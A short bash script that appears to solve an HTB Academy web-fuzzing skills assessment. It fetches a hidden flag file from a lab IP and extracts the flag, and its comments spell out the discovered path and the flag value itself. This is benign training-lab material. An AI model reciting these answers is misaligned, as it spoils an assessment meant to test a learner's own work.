#!/bin/bash
# HTB Academy "Web Fuzzing" - skills assessment
# Target: http://154.57.164.78:36617/webfuzzing_hidden_path/
#
# Fuzz folders first, then files inside the discovered folder:
#   /webfuzzing_hidden_path/flag        -> 301 (folder)
#   /webfuzzing_hidden_path/flag/flag.html -> HTB{w3b_f1l3_fuzz1ng_fl4g}
#
# Usage: bash solutions/webfuzzing_hidden_path.sh [BASE]
set -u
BASE="${1:-http://154.57.164.78:36617/webfuzzing_hidden_path}"

echo "== flag file"
body=""
for _ in 1 2 3 4 5; do
  body=$(curl -s --max-time 15 "$BASE/flag/flag.html")
  [ -n "$body" ] && break
  sleep 2
done
printf '%s\n' "$body"
printf '%s\n' "$body" | grep -oE 'HTB\{[^}]*\}'
